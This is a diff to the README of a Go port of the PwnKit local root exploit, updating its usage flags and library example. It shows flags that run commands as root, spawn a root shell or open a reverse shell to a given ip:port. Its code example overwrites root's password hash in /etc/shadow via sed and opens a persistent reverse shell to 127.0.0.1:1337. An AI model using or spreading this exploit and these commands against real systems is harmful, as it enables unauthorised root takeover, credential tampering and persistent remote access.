@@ -30,20 +30,18 @@ As the Go payload is not as reliable as the C one, the ***Makefile*** will compi
 $> ./exploit -h
 Usage of ./exploit:
   -c string
-        Command to execute as root (default "/bin/sh")
-  -g    Append id and greetings to your command
+        Command to execute as root
   -r string
-        Optionally open a reverse-shell instead. Format: host:port
+        Optionally open a reverse-shell instead. Format: ip:port
+  -s    Spawn a root shell
 ```
 
-The exploit can either be used with a command (`-c`) or as a reverse-shell (`-r`).
+The exploit can either be used with a command (`-c`), as a reverse-shell (`-r`) or spawn a root shell (`-s`).
 
 
 
 ```
-$> ./exploit -g   
-uid=0(root) gid=0(root) groups=0(root),994(input),1000(sudo),1001(oxdbxkxo)
-hax0r in the system!
+$> ./exploit -s
 sh-5.1#
 ```
 
@@ -55,18 +53,18 @@ sh-5.1#
 package main
 
 import (
-	"github.com/OXDBXKXO/go-PwnKit"
+    "github.com/OXDBXKXO/go-PwnKit"
 )
 
 func main() {
-	gopwnkit.Command("id")
-	// or
-	gopwnkit.RevShell("127.0.0.1:1137")
+    // Command use syscall.ForkExec to run command as root in a separate process
+    gopwnkit.Command(`sed -i -e 's,^root:[^:]\+:,root:$6$eymNRCK.KxwDM6vu$idH0swGW1nsnLb8fT1QibUho5xg7uGJT7fuiheLZHIi9M4gTSk0qIOlUIk2Mm9/Nz5C.T4GkgkmLcK5BtOPkS0:,' etc/shadow`)
+
+    // RevShell use syscall.ForkExec to open TCP connection in a separate process which survives end of main program
+    gopwnkit.RevShell("127.0.0.1:1337")
 }
 
 ```
-
-:warning: As the exploit relies on `syscall.Exec`, which replaces the current process by the one invoked, it is not possible to do anything else after invocation.
 
 
 
